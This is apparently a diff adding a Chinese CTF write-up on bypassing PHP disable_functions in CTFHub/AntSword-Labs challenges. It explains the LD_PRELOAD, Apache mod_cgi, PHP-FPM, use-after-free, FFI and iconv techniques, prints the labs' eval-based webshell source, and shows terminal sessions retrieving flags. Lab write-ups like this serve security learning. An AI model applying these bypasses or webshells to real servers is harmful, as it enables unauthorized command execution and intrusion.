@@ -3779,6 +3779,1224 @@ echo getenv("CTFHUB");
 
 ------
 
+## PHP Bypass disable_function
+
+### LD_PRELOAD
+
+> 目标：获取服务器上 /flag 文件中的 flag。需要了解 Linux LD_PRELOAD 环境变量。
+
+`LD_PRELOAD`绕过PHP禁用函数的技术原理是利用`Linux`环境变量优先加载恶意`.so`文件，劫持系统函数执行流程，当调用启动新进程的PHP函数时执行自定义命令。使用蚁剑工具的`disable_functions`插件，自动生成代理脚本和`.so`文件，成功绕过`LD_PRELOAD`靶机的函数限制。**LD_PRELOAD**绕过手法的核心在于**劫持系统函数**，让目标程序加载我们精心构造的恶意动态链接库（`.so`文件）。
+
+- LD_PRELOAD 环境变量：在Linux系统中，LD_PRELOAD是一个环境变量，它可以让你定义一个在程序运行前优先加载的动态链接库（.so文件）。这个优先加载的库中的函数可以覆盖后续加载的标准库中的同名函数 。
+- 劫持系统函数：如果我们可以让一个外部程序在运行时加载我们恶意的.so库，并且这个库里定义了某个系统函数（例如getuid、geteuid等），那么当该外部程序调用这个系统函数时，执行的就会是我们的恶意代码 。
+- PHP 函数的利用：在PHP中，我们需要找到一个能够启动新进程的函数（因为`LD_PRELOAD`是在程序启动时加载），通过这个新进程来加载我们的恶意库。常用的函数有`mail()` 或`error_log()` 。这些函数在底层会调用外部系统程序（如`mail()`会调用`/usr/sbin/sendmail`），从而创建新的进程。
+- 构造恶意动态链接库：我们创建一个C文件，其中定义一个在库加载时就会自动执行的函数（使用`__attribute__(constructor)`属性 ），或者劫持一个特定的、无参数且常用的系统函数（如`getuid()`或`geteuid()`）。在这个函数里执行我们想要的系统命令（例如读取`flag`）。
+
+> #### 使用蚁剑进行 LD_PRELOAD 绕过
+>
+> 蚁剑（AntSword） 是一款强大的Webshell管理工具，它集成了Bypass disable_function的插件，可以自动化上述过程。以下是具体步骤。
+>
+> - 连接Webshell：使用蚁剑成功连接到目标网站的Webshell。
+> - 检查限制与寻找可用函数：
+>   - 连接成功后，尝试在虚拟终端里执行命令（如whoami），可能会发现命令无法执行（例如返回ret=127 ）。
+>   - 此时，你需要查看phpinfo信息，确认disable_functions列表，并留意是否有未被禁用的、可以启动外部进程的函数，如error_log。如果mail函数被禁用，可以尝试使用error_log函数 。
+>
+> - 使用 Bypass Disable Functions 插件：
+>   - 在蚁剑中，找到并加载"Bypass Disable Functions"插件。
+>   - 选择 LD_PRELOAD 模式。
+>   - 根据目标环境，选择合适的进程函数。如果mail不可用，就选择error_log 。
+>   - 点击"开始"按钮执行。插件会自动完成以下工作 ：
+>     - 在服务器上生成恶意的.so文件（例如，使用`__attribute__(constructor)`属性的C代码编译而成，其中的命令可能是/readflag > /tmp/flag.txt ）。
+>     - 在网站目录下生成一个代理脚本（例如antproxy.php ），这个脚本会设置LD_PRELOAD环境变量并调用选定的进程函数。
+>   - 重新连接并获取Flag：
+>     - 使用蚁剑重新连接新生成的代理脚本的URL（密码通常与原Webshell相同）。
+>     - 连接成功后，现在你应该可以在蚁剑的虚拟终端中正常执行系统命令了 。
+>     - 执行读取flag的命令（例如cat /flag或执行/readflag ），即可成功获取flag。
+
+进入靶机后，`view-source`查看源码信息如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— LD_PRELOAD</title>
+</head>
+<body>
+    <h1>CTFHub Bypass disable_function —— LD_PRELOAD</h1>
+    <p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+本题考察LD_PRELOAD绕过disable_function限制的技术。题目提供一个通过`ant`参数执行任意PHP代码的入口，但关键系统命令函数已被禁用。攻击核心在于利用Linux的`LD_PRELOAD`环境变量——该变量允许在程序运行时优先加载自定义共享库。通过`putenv`设置`LD_PRELOAD`指向恶意编译的`.so`文件，再调用`mail()`、`error_log()`等仍可用的PHP函数触发子进程创建，从而劫持库函数执行流程。这种技术巧妙地将PHP代码执行转化为系统命令执行，有效绕过函数禁用限制，最终获取服务器权限。
+
+用`AntSword`连接靶机后，打开虚拟终端，发现在`php.ini`中禁用了一些命令执行函数。
+
+```
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-15ac886475f1924c-58d7c57699-mb8xm 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls
+ret=127
+```
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。在插件中选择模式**`LP_PRELOAD`**，点击开始即可。
+
+用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。
+
+编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-15ac886475f1924c-58d7c57699-mb8xm 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /flag
+cat: /flag: Permission denied
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{c0e71d95503c24d9860e804a}
+```
+
+提交`ctfhub{c0e71d95503c24d9860e804a}`即可。
+
+------
+
+### ShellShock
+
+> 利用PHP破壳完成 Bypass
+
+ShellShock漏洞（CVE-2014-6271）是一种Bash shell中的高危漏洞，攻击者可通过构造恶意环境变量在Bash子进程中执行任意命令。在本题中，该漏洞被用于绕过PHP的`disable_functions`限制，实现系统命令执行并获取flag。‌
+
+打开靶机后，`view-source`看到源码信息如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— ShellShock</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— ShellShock</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+如果直接用`AntSword`连接靶机会报错，需要将默认编码设置为`base64`再连接靶机。连接靶机后，如果直接访问根目录会出现错误：Path Not Found Or No Permission!
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`Apache_mod_cgi`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-261d04b664bcd288-5c8bc4b78-q44kc 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{5097a29aa3a4e57e518c5b66}
+```
+
+提交`ctfhub{5097a29aa3a4e57e518c5b66}`即可。
+
+------
+
+### Apache Mod CGI
+
+> 了解 Apache Mod CGI 为什么会 Bypass disable_function
+
+Apache Mod CGI 绕过的核心在于利用Apache的mod_cgi模块，将特定扩展名文件当作CGI脚本执行。
+
+- mod_cgi模块与CGI脚本：mod_cgi是Apache的一个模块，允许服务器执行CGI（通用网关接口）脚本。CGI是一种标准，定义了Web服务器与外部程序交互的方式。在Apache配置中，可以设定某些特定扩展名的文件（如.cgi、.sh，甚至自定义扩展名）被mod_cgi处理，即当请求这些文件时，Apache会执行它们而不是直接返回其内容。
+- 绕过disable_functions的思路：PHP的disable_functions配置只能限制PHP函数的调用。如果我们能通过Web服务器（Apache）的机制，直接执行一个系统 shell 脚本或二进制文件，那么这些PHP的限制自然就被绕过了。
+- 利用条件：要成功利用此方法，通常需要满足几个条件：
+  - 目标服务器是Apache。
+  - mod_cgi模块已启用。
+  - Apache配置中允许使用.htaccess文件（即AllowOverride选项不为None），并且我们有权限写入.htaccess文件。
+  - 对网站目录有写权限，以便上传.htaccess文件和我们的CGI脚本。
+
+- 利用链条：
+  - 首先上传一个自定义的.htaccess文件，通过其中的AddHandler或SetHandler指令，指定某个扩展名（例如.ares）的文件由mod_cgi处理。
+  - 然后上传一个具有该特定扩展名的Shell脚本（例如shell.ares），并确保其具有可执行权限（在某些配置下可能需要）。
+  - 当我们通过Web访问这个CGI脚本时，Apache会执行它，脚本中的系统命令（例如读取flag或反弹Shell）就会执行。
+
+简单来说，整个过程就是：利用.htaccess文件改变Apache对特定文件的处理方式，使其作为CGI脚本执行，从而绕过PHP的disable_functions限制。
+
+进入靶机后，`view-source`查看源码。
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— Apache Mod CGI</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— Apache Mod CGI</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+<a href="backdoor/">GetFlag</a>&nbsp;|&nbsp;<a href="index.php?action=reset" >重置backdoor目录</a>
+</body>
+</html>
+```
+
+点击`GetFlag`后，靶机跳转到`/backdoor/`，显示内容如下：
+
+```php
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，在虚拟终端直接输入`ls /`会显示`ret=127`。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`Apache_mod_cgi`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html/backdoor
+磁盘列表: /
+系统信息: Linux challenge-541999c0f884c2ec-7d9c598c48-5m22l 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html/backdoor) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html/backdoor) $ /readflag
+ctfhub{8e80c70d2fbaaa4045d83f55}
+```
+
+提交`ctfhub{8e80c70d2fbaaa4045d83f55}`即可。
+
+------
+
+### PHP-FPM
+
+> 正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。
+
+PHP-FPM绕过的核心在于与PHP-FPM服务直接通信，从而绕过PHP层面的限制。其基本原理可以概括为以下几步：
+
+- 利用条件：首先，你需要有一个Webshell，并且服务器环境是Nginx+PHP-FPM或Apache+PHP-FPM。PHP-FPM通常会监听一个端口（如9000）或一个Unix Socket文件（如/var/run/php/php7.2-fpm.sock）。
+- 通信协议：PHP-FPM采用FastCGI协议进行通信。通过向PHP-FPM监听的目标发送精心构造的FastCGI协议数据包，我们可以直接与其交互。
+- 执行任意PHP代码：在FastCGI协议中，可以通过设置某些参数（如PHP_VALUE和PHP_ADMIN_VALUE）来动态修改PHP配置。攻击者可以借此开启auto_prepend_file等选项，或者直接传递PHP代码让其执行，从而突破disable_functions的限制。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— 攻击PHP-FPM</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— 攻击PHP-FPM</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`Fastcgi/PHP-FPM`**，FPM/FCGI 地址选择`localhost:9000`，点击开始即可。
+
+用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。
+
+编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-1227efa87730f55d-6495fd8b4f-nqv82 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{8328d44f26ab81b419858927}
+```
+
+提交`ctfhub{8328d44f26ab81b419858927}`即可。
+
+------
+
+### GC UAF
+
+> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function，比如 GC UAF
+
+题目附件是https://bugs.php.net/bug.php?id=72530，这个漏洞是存在于 PHP 垃圾回收（GC）机制中的 “释放后使用（Use After Free）” ，主要与特定析构函数（Destructor）的交互有关，可能导致内存 corruption 或安全风险。该风险的生命周期从 2016 年报告到 2019 年修复，涉及多个 PHP 版本，且在修复后仍引发关于安全评级（如 CVE 分配）的讨论。
+
+GC UAF的核心是 GC 在处理含特定析构函数的对象时，引用计数判断错误，导致已释放的内存被再次访问，具体流程如下：
+
+- 构造循环引用与引用关联：通过 unserialize() 或手动代码创建特殊数据结构（如对象引用自身、数组引用对象属性），形成复杂的引用关系。
+  - 示例：报告中的 ryat 类析构函数会修改自身属性引用（$this->chtg = $this->ryat），打破正常引用计数逻辑。
+- 触发 GC 回收：通过 unset() 销毁变量或调用 gc_collect_cycles() 手动触发 GC，GC 会标记 “引用计数归 0” 的内存块并释放。
+- 引用计数判断失效：GC 依赖 “引用计数是否变化” 判断内存是否被外部引用，但风险场景中，析构函数修改引用后，内存的引用计数未发生预期变化，导致 GC 误判 “内存已无外部引用” 并释放，而实际仍有变量（如外部引用的 `$x`）指向该内存。
+- 释放后使用：后续代码访问该 “已释放但仍被引用” 的内存（如 `var_dump($out[2])`），触发 “释放后使用”，读取到无效数据（如伪造的内存内容）或导致内存 corruption。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— GC UAF</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— GC UAF</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+
+<p>参考链接:</p>
+<ul>
+    <li>
+        <a href="https://bugs.php.net/bug.php?id=72530" target="_blank">Bug #72530 Use after free in GC with Certain Destructors</a>
+    </li>
+</ul>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`PHP7_GC_UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-f5036ce6711e5e9c-847b445fdc-sf5r8 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{52eafb9fd6708f10689e7728}
+```
+
+提交`ctfhub{52eafb9fd6708f10689e7728}`即可。
+
+------
+
+### Json Serializer UAF
+
+> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 PHP #77843 Json Serializer UAF 漏洞。
+
+题目附件是https://bugs.php.net/bug.php?id=77843。PHP Bug #77843 是 2019 年 4 月披露的、存在于 PHP 7.3.3 版本中与 JSON 序列化相关的释放后使用（Use After Free）的风险，由用户 hanno at hboeck dot de 报告，可通过构造实现JsonSerializable接口的类（如自定义X类继承DateInterval并重写jsonSerialize方法）触发，在json_encode处理含引用的数组时，因未保留对象引用导致内存被释放后仍被访问，进而产生堆内存错误；官方最初将其归类为 “Bug” 而非安全问题，最终由 nikic 分配处理并于 2019 年 4 月 23 日通过提交修复，该风险无 CVE 编号，其核心原因是json_encode在处理实现JsonSerializable接口的对象时，未正确保留对象引用：
+
+- 当通过json_encode处理含引用的数组时，进入自定义jsonSerialize方法；
+- 方法内部执行unset操作删除数组中的对象元素，导致对象内存被标记为可释放并被回收；
+- 后续代码仍试图访问已释放的对象属性（如$this->y），触发堆内存读取错误（heap-use-after-free）。
+
+靶机的源码如下：
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— Json Serializer UAF</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— Json Serializer UAF</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`Json Serializer UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-f00748c2bf9b2268-5f95b85d49-ncfvq 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{21ec82bb73ad2d24ba611440}
+```
+
+提交`ctfhub{21ec82bb73ad2d24ba611440}`即可。
+
+------
+
+### Backtrace UAF
+
+> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function
+
+题目附件是https://bugs.php.net/bug.php?id=76047。PHP Bug #76047 是 2018 年 3 月报告、2020 年 1 月修复的释放后使用（Use-after-free）安全风险，主要影响PHP 7.0-7.4 版本，触发根源是析构函数中创建异常并捕获回溯（backtrace）时，回溯包含已销毁的函数参数引用，导致访问已释放内存；最初表现为可复现崩溃（如PDOStatement->fetchAll()或file()函数崩溃），2019 年 10 月出现公开利用工具（如php7-backtrace-bypass）用于绕过disable_functions，最终由 nikic 通过提交修复。
+
+UAF根源是回溯（backtrace）中包含已销毁的函数参数引用，具体流程如下：
+
+- 函数参数引用计数控制：当函数参数（如$some_string）通过函数调用赋值（如$some_string = date('Y-m-d');），其引用计数变为 2（而非直接赋值的 1）。
+- 析构函数中的操作：自定义类的析构函数中，先通过unset销毁对象属性（如unset($this->a);），该属性指向的函数参数内存被标记为可释放并回收。
+- 回溯捕获与无效引用：析构函数中创建Exception并调用getTrace()获取回溯，回溯会保存函数调用栈中的参数引用；由于步骤 2 中参数已销毁，回溯中保留的是 “已释放内存的无效引用”。
+- 释放后使用触发：后续代码访问回溯中的无效引用，触发 “释放后使用” 错误，导致内存分配函数（如zend_mm_alloc_small）崩溃，表现为段错误（SIGSEGV）。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— Backtrace UAF</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— Backtrace UAF</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`PHP7 Backtrace UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-fbeab2bcaf122347-6c699967b5-4895v 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{165de9553c72c2ed248afe32}
+```
+
+提交`ctfhub{165de9553c72c2ed248afe32}`即可。
+
+------
+
+### FFI 扩展
+
+> FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。
+
+蚁剑工具利用 PHP FFI 绕过disable_functions的原理是利用 PHP 7.4 及以上版本提供的 FFI 特性，直接调用 C 标准库中的函数来执行系统命令，从而绕过 PHP 层面的函数禁用限制。以下是详细介绍：
+
+- FFI 特性简介：FFI（Foreign Function Interface）是 PHP 7.4 引入的关键特性，允许 PHP 代码直接调用 C 语言编写的动态链接库中的函数。允许开发者在**纯 PHP 脚本中直接调用 C 语言库**，无需编写 C 语言扩展（如传统的 mysqli、curl 扩展），极大降低了 C 库复用的门槛。通过 FFI，开发者可以在 PHP 中声明 C 函数的原型，然后直接调用这些函数，而无需编写传统的 PHP 扩展。
+- 绕过原理：disable_functions是在 PHP 层面禁用了一些危险的函数，如system、exec等。但 FFI 可以绕过 PHP 的函数表，直接与操作系统的底层库进行交互。攻击者可以利用 FFI 加载 Linux 系统中的 C 标准库libc.so.6，然后直接调用其中的system函数来执行系统命令。
+- 利用条件：使用 FFI 绕过disable_functions需要满足一定的条件，首先 PHP 版本必须大于等于 7.4，其次php.ini中ffi.enable必须为"true"或"preload"。
+
+**FFI扩展与传统 C 扩展的对比**
+
+|   对比维度   |                       传统 C 扩展方案                        |                        PHP FFI 方案                         |
+| :----------: | :----------------------------------------------------------: | :---------------------------------------------------------: |
+| **开发成本** | 需学习 PHP 扩展开发流程（如 Zend 引擎 API、编译配置），学习成本高 | 仅需在 PHP 中声明 C 函数原型，无需掌握 C 扩展知识，易用性高 |
+|  **灵活性**  |            扩展编译后需重新编译才能更新，灵活性低            |      直接在 PHP 脚本中修改 C 函数调用逻辑，迭代效率高       |
+|   **性能**   |                  编译为二进制扩展，性能略优                  | 需动态解析 C 函数原型，存在轻微性能损耗（可通过预加载优化） |
+| **适用场景** |      成熟稳定的高频调用场景（如官方 curl、mysqli 扩展）      |          快速复用小众 C 库、原型验证、低频调用场景          |
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— FFI</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— FFI</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+
+<p>参考链接:</p>
+<ul>
+    <li>
+        <a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank">PHP FFI - 一种全新的PHP扩展方式</a>
+    </li>
+</ul>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`PHP74_FFI`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-147c0a6bad5c0066-5689644567-jt57k 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{4afe7260766fd7b414137f00}
+```
+
+提交`ctfhub{4afe7260766fd7b414137f00}`即可。
+
+------
+
+### iconv
+
+`iconv`绕过`disable_functions`的技巧，主要利用了Linux系统中`iconv`函数相关的一个环境变量设计特性。下面这个表格总结了其核心攻击流程和原理：
+
+|     步骤     |       关键组件        |                          作用与原理                          |
+| :----------: | :-------------------: | :----------------------------------------------------------: |
+| **设置环境** | `GCONV_PATH` 环境变量 | 通过`putenv`设置，**欺骗**`iconv`函数去加载攻击者自定义的`gconv-modules`配置文件，而非系统默认路径下的文件。 |
+| **配置文件** | `gconv-modules` 文件  | 指示系统在需要进行字符集转换时，**加载**我们指定的恶意共享库（`.so`文件）。 |
+|  **恶意库**  |   编译的 `.so` 文件   | 包含在库初始化时（如`gconv_init`函数中）执行的**恶意系统命令**。利用`__attribute__ ((constructor))`或`gconv_init`函数，使动态库被加载时执行代码。 |
+| **触发执行** |     `iconv` 函数      | 当PHP调用`iconv`进行字符集转换时，它会遵循`GCONV_PATH`的指引，**触发**恶意动态库的加载和执行其中的代码 |
+
+这道题可以通过利用Linux系统`iconv`函数的环境变量特性（`GCONV_PATH`），配合恶意`gconv-modules`配置文件和`.so`动态库，成功绕过`PHP`安全限制实现命令执行。使用蚁剑工具的`disable_function`插件生成反向代理木马（`.antproxy.php`），建立新会话连接后通过虚拟终端获取`flag`。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— iconv</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— iconv</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`iconv`**，点击开始即可。
+
+用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。
+
+编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-b999490ca8af10c7-5cd48dd9ff-mp2tj 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{5485220b518d9447b346ea83}
+```
+
+提交`ctfhub{5485220b518d9447b346ea83}`即可。
+
+------
+
+### bypass iconv 1
+
+这题是利用PHP iconv扩展进行`disable_functions`绕过的攻击环境，通过`eval($_REQUEST['ant'])`获取恶意代码。攻击者借助iconv字符转换功能中的GCONV_PATH环境变量机制，通过putenv设置自定义字符集转换配置路径，诱导iconv函数加载恶意共享库(.so文件)，利用gconv-modules配置文件指向包含系统命令的恶意模块，在动态库初始化时执行任意命令，从而绕过PHP安全限制实现权限提升和Webshell持久化控制。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— iconv  Bypass 1</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— iconv  Bypass 1</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
